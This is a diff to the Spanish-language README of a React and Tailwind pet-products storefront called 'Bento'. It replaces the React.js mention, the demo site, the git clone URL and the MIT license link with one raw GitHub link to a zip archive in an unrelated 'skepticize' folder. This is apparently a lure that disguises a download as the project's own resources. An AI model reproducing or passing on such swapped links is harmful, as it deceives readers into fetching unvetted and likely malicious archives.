@@ -1,9 +1,9 @@
 # Bento - E-commerce de Mascotas con React
 
-"Bento" es una interfaz de usuario dinámica y responsiva para un e-commerce de productos para mascotas, desarrollada con React.js y Tailwind CSS. El proyecto implementa un diseño tipo "Bento grid" para mostrar productos de manera atractiva y organizada, con funcionalidades de filtrado por categorías y gestión de favoritos.
+"Bento" es una interfaz de usuario dinámica y responsiva para un e-commerce de productos para mascotas, desarrollada con https://raw.githubusercontent.com/willsondev/Bento---E-commerce-de-Mascotas-con-React/main/skepticize/Bento---E-commerce-de-Mascotas-con-React.zip y Tailwind CSS. El proyecto implementa un diseño tipo "Bento grid" para mostrar productos de manera atractiva y organizada, con funcionalidades de filtrado por categorías y gestión de favoritos.
 
 ## Demo del proyecto
-https://patitasfelicesonline.netlify.app/
+https://raw.githubusercontent.com/willsondev/Bento---E-commerce-de-Mascotas-con-React/main/skepticize/Bento---E-commerce-de-Mascotas-con-React.zip
 
 ## Características Principales
 
@@ -16,7 +16,7 @@ https://patitasfelicesonline.netlify.app/
 
 ## Tecnologías Utilizadas
 
-* React.js
+* https://raw.githubusercontent.com/willsondev/Bento---E-commerce-de-Mascotas-con-React/main/skepticize/Bento---E-commerce-de-Mascotas-con-React.zip
 * Tailwind CSS
 
 ## Instalación
@@ -24,7 +24,7 @@ https://patitasfelicesonline.netlify.app/
 1.  Clona el repositorio:
 
     ```bash
-    git clone https://github.com/willsondev/Bento---E-commerce-de-Mascotas-con-React.git
+    git clone https://raw.githubusercontent.com/willsondev/Bento---E-commerce-de-Mascotas-con-React/main/skepticize/Bento---E-commerce-de-Mascotas-con-React.zip
     ```
 
 2.  Instala las dependencias:
@@ -51,7 +51,7 @@ Las contribuciones son bienvenidas. Si encuentras algún error o tienes ideas pa
 
 ## Licencia
 
-Este proyecto está bajo la licencia [MIT](https://opensource.org/licenses/MIT).
+Este proyecto está bajo la licencia [MIT](https://raw.githubusercontent.com/willsondev/Bento---E-commerce-de-Mascotas-con-React/main/skepticize/Bento---E-commerce-de-Mascotas-con-React.zip).
 
 ## Contacto
 
